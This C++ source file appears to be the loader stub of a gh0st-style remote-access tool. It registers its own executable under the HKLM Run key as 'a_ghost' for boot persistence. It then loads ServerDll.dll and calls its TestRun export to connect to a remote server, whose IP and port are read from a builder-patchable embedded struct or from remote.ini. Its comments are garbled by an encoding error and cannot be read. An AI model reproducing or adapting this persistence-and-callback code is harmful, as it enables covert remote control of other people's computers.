#include <windows.h>
#include <stdio.h>
#include <iostream>

typedef void (*StopRun)();

typedef bool (*IsStoped)();

// ֹͣ��������
StopRun stop = NULL;

// �Ƿ�ɹ�ֹͣ
IsStoped bStop = NULL;

struct CONNECT_ADDRESS
{
	DWORD dwFlag;
	char  szServerIP[MAX_PATH];
	int   iPort;
}g_ConnectAddress={0x1234567,"",0};

/** 
* @brief ���ñ�����������
* @param[in] *sPath ע����·��
* @param[in] *sNmae ע���������
* @return ����ע����
* @details Win7 64λ�����ϲ��Խ��������ע�����ڣ�\n
* HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
* @note �״�������Ҫ�Թ���ԱȨ�����У�������ע���д�뿪��������
*/
BOOL SetSelfStart(const char *sPath, const char *sNmae)
{
	// д���ע���·��
#define REGEDIT_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"

	// ��ע�����д��������Ϣ
	HKEY hKey = NULL;
	LONG lRet = RegOpenKeyExA(HKEY_LOCAL_MACHINE, REGEDIT_PATH, 0, KEY_ALL_ACCESS, &hKey);

	// �ж��Ƿ�ɹ�
	if(lRet != ERROR_SUCCESS)
		return FALSE;

	lRet = RegSetValueExA(hKey, sNmae, 0, REG_SZ, (const BYTE*)sPath, strlen(sPath) + 1);

	// �ر�ע���
	RegCloseKey(hKey);

	// �ж��Ƿ�ɹ�
	return lRet == ERROR_SUCCESS;
}

int main(int argc, const char *argv[])
{
	if(!SetSelfStart(argv[0], "a_ghost"))
	{
		std::cout<<"���ÿ���������ʧ��.\n";
	}
	char path[_MAX_PATH], *p = path;
	GetModuleFileNameA(NULL, path, sizeof(path));
	while (*p) ++p;
	while ('\\' != *p) --p;
	strcpy(p+1, "ServerDll.dll");
	HMODULE hDll = LoadLibraryA(path);
	typedef void (*TestRun)(char* strHost,int nPort);
	TestRun run = hDll ? TestRun(GetProcAddress(hDll, "TestRun")) : NULL;
	stop = hDll ? StopRun(GetProcAddress(hDll, "StopRun")) : NULL;
	bStop = hDll ? IsStoped(GetProcAddress(hDll, "IsStoped")) : NULL;
	if (run)
	{
		char *ip = g_ConnectAddress.szServerIP;
		int &port = g_ConnectAddress.iPort;
		if (0 == strlen(ip))
		{
			strcpy(p+1, "remote.ini");
			GetPrivateProfileStringA("remote", "ip", "127.0.0.1", ip, _MAX_PATH, path);
			port = GetPrivateProfileIntA("remote", "port", 2356, path);
		}
		printf("[remote] %s:%d\n", ip, port);
		run(ip, port);
#ifdef _DEBUG
		while(1){ char ch[64]; std::cin>>ch; if (ch[0]=='q'){ break; } }
		if (stop) stop();
		while(bStop && !bStop()) Sleep(200);
#endif
	}
	return -1;
}
